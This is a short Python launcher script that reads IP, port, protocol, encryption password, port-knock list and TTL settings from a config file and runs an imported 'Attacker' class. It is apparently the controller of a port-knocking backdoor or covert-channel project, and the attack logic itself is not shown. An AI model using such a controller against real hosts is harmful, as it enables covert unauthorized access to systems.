import configparser
from attacker import Attacker

def main():

    config = configparser.ConfigParser()
    config.read('setup.config')

    localIP = config.get('Attacker', 'localIP')
    localPort = config.get('Attacker', 'localPort')
    remoteIP = config.get('Attacker', 'remoteIP')
    remotePort = config.get('Attacker', 'remotePort')
    protocol = config.get('General', 'protocol')
    password = config.get('Encryption', 'password')
    listenPort = config.get('General', 'listenPort')
    knockList = config.get('General', 'knockList')
    ttl = config.get('General', 'ttl')

    print(localIP, localPort, listenPort, remoteIP, remotePort, protocol, password)
    attacker = Attacker(localIP, localPort, listenPort, remoteIP, remotePort, protocol, password, knockList, ttl)
    attacker.run()

if __name__ == '__main__':
    main()
